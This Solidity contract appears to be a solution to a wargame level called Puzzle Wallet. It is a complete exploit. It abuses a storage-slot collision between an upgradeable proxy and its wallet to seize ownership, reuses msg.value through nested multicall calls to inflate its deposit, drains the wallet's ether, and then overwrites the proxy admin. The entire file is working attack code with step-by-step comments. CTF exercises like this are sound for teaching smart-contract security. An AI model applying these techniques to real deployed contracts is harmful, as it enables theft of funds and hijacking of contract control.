// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// Needed for nested dynamic arrays
pragma experimental ABIEncoderV2;

import "./PuzzleProxy.sol";

contract Level24 {
    PuzzleProxy puzzleProxy;
    PuzzleWallet puzzleWallet;

    constructor(address payable puzzleProxyAddr) public {
        puzzleProxy = PuzzleProxy(puzzleProxyAddr);
        puzzleWallet = PuzzleWallet(puzzleProxyAddr);
    }

    function main(address desiredAdmin) public payable {
        uint256 balance = getPuzzleProxyBalance();
        require(msg.value >= balance, "Insufficient balance");

        // Overwrite `owner` slot in `PuzzleWallet`
        puzzleProxy.proposeNewAdmin(address(this));
        // Now that we're the `owner`, we can edit the whitelist
        puzzleWallet.addToWhitelist(address(this));

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);

        // Re-use `msg.value` in `multicall`, bypassing the `deposit`
        // restriction by passing it through another `multicall`.
        bytes[] memory data = new bytes[](2);
        data[0] = (
            abi.encodeWithSelector(puzzleWallet.multicall.selector, depositData)
        );
        data[1] = (
            abi.encodeWithSelector(puzzleWallet.multicall.selector, depositData)
        );
        puzzleWallet.multicall{value: balance}(data);

        // Now, `address(this)` has 2 * `balance` AND
        // `address(puzzleProxy).balance` is 2 * `balance` (the original admin
        // also has `balance`). We drain the contract by calling `execute` to
        // withdraw.
        puzzleWallet.execute(address(this), 2 * balance, "");

        // Now that the contract is empty, overwrite `admin` in `PuzzleProxy`
        puzzleWallet.setMaxBalance(uint256(desiredAdmin));
    }

    function getPuzzleProxyBalance() public view returns (uint256) {
        return address(puzzleProxy).balance;
    }

    // Allows us to receive ether from `puzzleWallet` when we drain it.
    receive() external payable {}
}
